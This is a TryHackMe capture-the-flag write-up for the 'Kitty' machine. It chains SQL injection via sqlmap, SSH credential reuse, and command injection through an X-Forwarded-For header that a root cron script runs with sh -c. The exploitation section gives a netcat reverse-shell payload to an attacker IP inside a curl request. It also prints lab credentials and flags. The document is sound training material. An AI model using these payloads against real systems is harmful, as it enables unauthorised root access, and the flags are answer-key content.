# Kitty - TryHackMe Writeup

## Overview

Today we are going to solve another **Medium** difficulty Linux-based machine from **TryHackMe** named **Kitty**.

This machine focuses on **Web Application Exploitation**, **SQL Injection**, **Database Enumeration**, **Credential Reuse**, and **Linux Privilege Escalation**. During this challenge we exploit a vulnerable authentication system to dump the application's database, recover valid credentials, gain SSH access as a legitimate user, enumerate the operating system for privilege escalation vectors, discover a hidden internal development application, and finally exploit an insecure logging mechanism executed by a privileged cron job to obtain a root shell.

---

# Scenario

The target exposes only a minimal attack surface consisting of an SSH service and an Apache web server. Initial enumeration reveals a login application that appears fairly standard, but deeper investigation shows that the authentication mechanism is vulnerable to SQL Injection. After compromising the web application, valid user credentials can be recovered and reused to obtain SSH access. Once inside the machine, privilege escalation requires careful enumeration of scheduled tasks, hidden services, and insecure shell execution inside a root-owned cron job.

---

# Target Information

| Target | Value |
|---------|-------|
| Machine | Kitty |
| Difficulty | Medium |
| Operating System | Linux |
| IP Address | 10.49.169.76 |

---

# Reconnaissance

As always, the first step is identifying every exposed TCP service using a full TCP port scan.

```bash
nmap -p- 10.49.169.76
```

Result:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only two ports are exposed:

- SSH (22)
- HTTP (80)

Since no additional services are externally accessible, the web server becomes the primary attack surface.

---

# Service Enumeration

A second scan is performed to identify service versions and execute Nmap's default NSE scripts.

```bash
nmap -sC -sV 10.49.169.76
```

Result:

```text
22/tcp open ssh
OpenSSH 8.2p1 Ubuntu

80/tcp open http
Apache httpd 2.4.41
```

Additional observations:

- Ubuntu Linux host
- Apache 2.4.41
- Login page presented immediately
- PHPSESSID cookie does not contain the HttpOnly flag
- Only GET, HEAD, POST and OPTIONS methods enabled

At this stage nothing immediately appears vulnerable, therefore deeper web enumeration becomes necessary.

---

# Web Enumeration

Browsing to port **80** displays a simple authentication portal consisting of:

- Login Page
- Registration Page

Before interacting heavily with the application, Burp Suite is started to intercept every request exchanged between the browser and the server. This allows us to inspect POST parameters, hidden fields, cookies and later replay requests during exploitation.

Since hidden resources frequently expose additional functionality, directory enumeration is performed.

```bash
gobuster dir \
-u http://10.49.169.76/ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
```

Gobuster discovers several interesting files.

```text
/index.php
/register.php
/config.php
/logout.php
/welcome.php
```

Most remaining responses correspond to Apache protected files such as:

```text
.htaccess
.htpasswd
.htgroup
```

returning HTTP 403 responses.

The most interesting discoveries are:

- index.php
- register.php
- config.php

The application appears intentionally small with authentication handled entirely through PHP pages.

---

# Authentication Analysis

Manual testing of both the login and registration functionality reveals standard username and password fields.

Rather than blindly attempting payloads manually, the login request is intercepted inside Burp Suite and saved into a request file.

Saving the complete request preserves:

- Headers
- Cookies
- POST parameters
- Session values

This provides SQLMap with an accurate copy of the application's authentication request.

---

# SQL Injection Discovery

The captured Burp request is supplied directly to SQLMap.

```bash
sqlmap -r login.txt --batch
```

SQLMap automatically detects a SQL Injection vulnerability inside one of the authentication parameters.

Instead of manually extracting information using UNION SELECT statements, SQLMap is instructed to enumerate and dump the database automatically.

```bash
sqlmap -r login.txt --dump
```

The enumeration reveals the backend database together with the application's user table.

After dumping the records, valid credentials are recovered.

```
Username : kitty

Password : L0ng_Liv3_KittY
```

This demonstrates that the application's authentication backend is vulnerable to SQL Injection, allowing attackers to recover sensitive information without possessing any legitimate account.

Rather than attempting privilege escalation through the web application itself, credential reuse becomes the next logical step.

---

# SSH Access

Using the recovered credentials, authentication is attempted over SSH.

```bash
ssh kitty@10.49.169.76
```

Password:

```text
L0ng_Liv3_KittY
```

Authentication succeeds immediately.

Verifying our identity:

```bash
whoami
```

Output:

```text
kitty
```

At this stage we have obtained a stable shell as a legitimate local user.

This also demonstrates one of the most common real-world attack paths:

- SQL Injection
- Database Dump
- Credential Disclosure
- Credential Reuse
- Operating System Access

---

# User Enumeration

Listing the user's home directory immediately reveals the user flag.

```bash
ls
```

Output:

```text
user.txt
```

Reading the file:

```bash
cat user.txt
```

Result:

```text
THM{31e606998972c3c6baae67bab463b16a}
```

The initial compromise has now been completed.

---

# Initial Privilege Escalation Enumeration

With user access established, the next objective is obtaining root privileges.

The first check is always sudo permissions.

```bash
sudo -l
```

Result:

```text
Sorry, user kitty may not run sudo.
```

No sudo permissions are available.

Standard privilege escalation enumeration is then performed, including:

- SUID binaries
- Writable files
- Capabilities
- Scheduled tasks
- Cron jobs
- Running services

Nothing immediately obvious appears vulnerable.

Rather than relying solely on static enumeration, we decide to inspect processes executing on the machine in real time.

---

# Process Monitoring with pspy64

The **pspy64** utility is transferred onto the target using a temporary Python HTTP server.

After downloading the binary onto the victim machine, execution begins.

```bash
chmod +x pspy64

./pspy64
```

Unlike traditional monitoring tools, **pspy64** does not require root privileges and allows ordinary users to observe processes started by privileged accounts.

After waiting a short period, several recurring processes become visible.

```text
UID=0

/usr/sbin/CRON -f

/bin/sh -c /usr/bin/bash /opt/log_checker.sh
```

The important observation is that `/opt/log_checker.sh` executes repeatedly as **root** through cron.

Any script executed automatically by root immediately becomes a high-priority privilege escalation target because insecure handling of user-controlled input frequently leads to command execution.

The next step is to inspect the contents of this script and determine whether it processes attacker-controlled data in an unsafe manner.


# Root Cause Analysis

Since the previous enumeration identified `/opt/log_checker.sh` being executed repeatedly as **root**, the next step is inspecting the script itself.

Reading the file:

```bash
cat /opt/log_checker.sh
```

Contents:

```bash
#!/bin/sh
while read ip;
do
  /usr/bin/sh -c "echo $ip >> /root/logged";
done < /var/www/development/logged

cat /dev/null > /var/www/development/logged
```

The script continuously reads every line contained inside:

```text
/var/www/development/logged
```

For every value read, it executes:

```bash
/usr/bin/sh -c "echo $ip >> /root/logged"
```

Although this initially appears harmless, there is a critical mistake.

The variable:

```bash
$ip
```

is expanded directly inside a shell command without any sanitization or quoting.

This means that **shell command substitution** can be injected into the variable before it is executed by the root-owned cron job.

Instead of simply writing an IP address into `/root/logged`, arbitrary commands can be executed as **root**.

---

# Discovering the Internal Development Application

The next question becomes:

**Who writes into `/var/www/development/logged`?**

Further enumeration reveals another Apache virtual host.

Reading the Apache configuration:

```bash
cat /etc/apache2/sites-enabled/dev_site.conf
```

The configuration shows:

```text
Listen 127.0.0.1:8080
```

This immediately indicates an internal-only web application.

Because Apache is listening exclusively on localhost, it cannot be accessed directly from our attacking machine.

Instead, SSH Local Port Forwarding is used.

```bash
ssh -L 8080:127.0.0.1:8080 kitty@10.49.169.76
```

This forwards our local TCP port **8080** to the remote host's localhost interface.

Opening:

```
http://127.0.0.1:8080
```

now displays the hidden development login page.

---

# Understanding the Logging Mechanism

Reviewing the HTML source reveals a familiar authentication form.

The application submits POST requests to:

```php
index.php
```

To understand how logging behaves, a manual request is sent using curl.

```bash
curl -X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-H "X-Forwarded-For: hello" \
-d "username=0xb0b&password=asdasd" \
http://127.0.0.1:8080/index.php
```

Response:

```text
SQL Injection detected.
This incident will be logged!
```

Checking the logging file:

```bash
cat /var/www/development/logged
```

Output:

```text
hello
```

This proves something important.

Instead of recording the real client IP address, the application blindly trusts the value supplied inside the **X-Forwarded-For** HTTP header.

Whatever value is provided becomes the content later processed by the root cron job.

This creates a complete attack chain:

```
User Input
      │
      ▼
X-Forwarded-For Header
      │
      ▼
Logged into /var/www/development/logged
      │
      ▼
Root Cron Job Reads File
      │
      ▼
Shell Executes Unsanitized Variable
      │
      ▼
Root Command Injection
```

---

# Exploiting Command Injection

Since the value is executed inside:

```bash
sh -c
```

we can inject shell substitution.

Instead of sending a normal IP address, the malicious payload becomes:

```bash
$(busybox nc ATTACKER_IP 4444 -e /bin/bash)
```

Complete request:

```bash
curl -X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-H "X-Forwarded-For: \$(busybox nc 10.8.211.1 4444 -e /bin/bash)" \
-d "username=0xb0b&password=asdasd" \
http://127.0.0.1:8080/index.php
```

Before sending the request, a listener is started on the attacking machine.

```bash
nc -lvnp 4444
```

After the cron job executes, the reverse shell connects back.

```text
connect to [ATTACKER] from 10.49.169.76
```

Checking privileges:

```bash
id
```

Output:

```text
uid=0(root)
gid=0(root)
```

The injected command has executed directly inside the root-owned cron process, providing an immediate root shell.

---

# Root Flag

Navigating into the root directory:

```bash
cd /root
```

Listing the contents:

```bash
ls
```

Output:

```text
root.txt
```

Reading the flag:

```bash
cat root.txt
```

Result:

```text
THM{581bfc26b53f2e167a05613eecf039bb}
```

The machine has now been completely compromised.

---

# Complete Attack Chain

```
Nmap Enumeration
        │
        ▼
Web Enumeration
        │
        ▼
Gobuster Directory Discovery
        │
        ▼
Burp Suite Request Capture
        │
        ▼
SQL Injection Discovery
        │
        ▼
SQLMap Database Dump
        │
        ▼
Credential Recovery
        │
        ▼
SSH Access (kitty)
        │
        ▼
User Flag
        │
        ▼
pspy64 Enumeration
        │
        ▼
Root Cron Job Discovery
        │
        ▼
Internal Development Website
        │
        ▼
SSH Local Port Forwarding
        │
        ▼
Header Injection (X-Forwarded-For)
        │
        ▼
Command Injection
        │
        ▼
Root Reverse Shell
        │
        ▼
Root Flag
```

---

# Vulnerabilities Identified

- SQL Injection in the authentication functionality.
- Sensitive credentials stored inside the database.
- Password reuse allowing SSH authentication.
- Internal development application exposed on localhost.
- Application trusts the `X-Forwarded-For` header without validation.
- Root-owned cron job executes unsanitized user-controlled input using `sh -c`.
- Lack of input sanitization leading to command injection.
- Insecure automation executed with root privileges.

---

# MITRE ATT&CK Mapping

| Technique | ATT&CK ID |
|-----------|-----------|
| Active Scanning | T1595 |
| Exploit Public-Facing Application | T1190 |
| Valid Accounts | T1078 |
| SSH | T1021.004 |
| Command and Scripting Interpreter | T1059 |
| Scheduled Task / Cron | T1053.003 |
| Command Injection | T1059 |
| Privilege Escalation | TA0004 |

---

# Tools Used

- Nmap
- Gobuster
- Burp Suite
- SQLMap
- SSH
- pspy64
- curl
- Netcat
- Apache Configuration Review
- Linux Enumeration Utilities

---

# Lessons Learned

This machine demonstrates how seemingly unrelated weaknesses can combine into a complete system compromise. A SQL Injection vulnerability exposed database credentials, which were successfully reused for SSH access. Once inside the system, process monitoring with `pspy64` uncovered a root-owned cron job executing a shell script. Further enumeration revealed an internal development application accessible only through localhost, which trusted the `X-Forwarded-For` header and logged attacker-controlled input. Because the cron job later processed this data using `sh -c` without sanitization, arbitrary commands could be executed as root. The challenge highlights the importance of secure input validation, protecting internal services, avoiding credential reuse, and never executing user-controlled data within privileged scripts.

---

# Conclusion

The **Kitty** machine provides an excellent demonstration of chaining multiple lower-severity vulnerabilities into full system compromise. Beginning with reconnaissance and web enumeration, a SQL Injection vulnerability allowed database extraction and recovery of valid user credentials. Reusing these credentials provided SSH access as a legitimate user. Careful post-exploitation enumeration using `pspy64` uncovered a root cron job processing data from an internal development application. By abusing the application's trust in the `X-Forwarded-For` header and exploiting unsafe shell execution within the cron script, arbitrary commands were executed with root privileges, resulting in complete compromise of the target. This room reinforces the importance of defense in depth, proper input validation, secure automation, and protecting internal services from indirect attacker influence.
